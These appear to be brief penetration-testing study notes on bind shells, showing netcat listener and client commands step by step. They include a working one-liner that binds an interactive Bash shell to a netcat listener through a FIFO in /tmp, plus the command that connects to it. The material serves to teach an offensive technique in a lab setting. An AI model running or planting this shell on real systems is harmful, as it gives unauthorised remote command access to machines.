# Bind Shells


No. 1: Server - Target starting Netcat listener
Target@server:~$ nc -lvnp 7777

No. 2: Client - Attack box connecting to target
nc -nv 10.129.41.200 7777

No. 3: Server - Target receiving connection from client
Target@server:~$ nc -lvnp 7777

## Establishing a Basic Bind Shell with Netcat

No. 1: Server - Binding a Bash shell to the TCP session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

No. 2: Client - Connecting to bind shell on target
nc -nv 10.129.41.200 7777
